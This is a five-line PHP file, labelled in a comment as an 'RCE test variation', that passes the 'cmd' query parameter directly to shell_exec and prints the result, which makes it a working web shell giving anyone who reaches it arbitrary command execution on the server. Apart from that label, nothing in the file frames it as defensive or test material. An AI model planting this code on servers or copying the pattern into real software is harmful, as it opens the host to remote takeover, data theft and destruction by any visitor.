<?php
// RCE test variation #1236
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>